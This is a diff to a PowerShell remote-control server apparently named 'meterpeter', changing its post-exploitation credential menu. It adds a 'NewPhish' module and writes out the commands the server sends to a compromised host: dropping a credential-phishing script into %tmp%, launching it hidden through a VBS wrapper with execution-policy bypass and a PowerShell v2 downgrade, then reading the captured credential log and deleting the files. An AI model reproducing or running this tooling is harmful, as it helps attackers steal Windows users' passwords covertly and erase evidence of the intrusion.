@@ -1238,7 +1238,7 @@ While($Client.Connected)
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Creds> " -NoNewline -ForeGroundColor Green;
         $cred_choise = Read-Host;
-        If($cred_choise -eq "OldBox" -or $cred_choise -eq "oldbox")
+        If($cred_choise -eq "OldBox" -or $cred_choise -eq "old")
         {
           $name = "CredsPhish.ps1";
           $File = "$Bin$name"
@@ -1268,7 +1268,7 @@ While($Client.Connected)
             $Upload = $False;
           }
         }
-        If($cred_choise -eq "NewBox" -or $cred_choise -eq "newbox")
+        If($cred_choise -eq "NewBox" -or $cred_choise -eq "new")
         {
           $name = "NewPhish.ps1";
           $File = "$Bin$name"
@@ -1286,10 +1286,10 @@ While($Client.Connected)
             $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File %tmp%\NewPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\NewPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\NewPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;cmd /R %tmp%\CredsPhish.vbs}";
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
+            $NewPhishing = $True;
             $Upload = $True;
-            $Phishing = $True;
           }else{
-            ## Local File { CredsPhish.ps1 } not found .
+            ## Local File { NewPhish.ps1 } not found .
             Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
             Write-Host "   ------     ----------";
             Write-Host "   Not Found  $File" -ForeGroundColor red;
@@ -1301,7 +1301,7 @@ While($Client.Connected)
         If($cred_choise -eq "ReadLog" -or $cred_choise -eq "ReadLog")
         {
           write-host " Read Remote-Host Credential LogFile" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n";
-          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force}else{echo `"   [i] Not Found: `$env:tmp\CredsPhish.log`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force}";
+          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force;Remove-Item `$env:tmp\NewPhish.ps1 -Force}else{echo `"   [i] Not Found: `$env:tmp\CredsPhish.log`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force;Remove-Item `$env:tmp\NewPhish.ps1 -Force}";
         }
         If($cred_choise -eq "Return" -or $cred_choise -eq "return" -or $cred_choise -eq "cls" -or $cred_choise -eq "Modules" -or $cred_choise -eq "modules" -or $cred_choise -eq "clear")
         {
@@ -1863,6 +1863,12 @@ While($Client.Connected)
             $OutPut = $OutPut -replace ".ps1",".log";
             write-host "   output   $OutPut";
             $Phishing = "False";
+          }
+          If($NewPhishing  -eq "True")
+          {
+            $OutPut = $OutPut -replace "NewPhish.ps1","CredsPhish.log";
+            write-host "   output   $OutPut";
+            $NewPhishing = "False";
           }
           $Command = $Null;
         } Else {
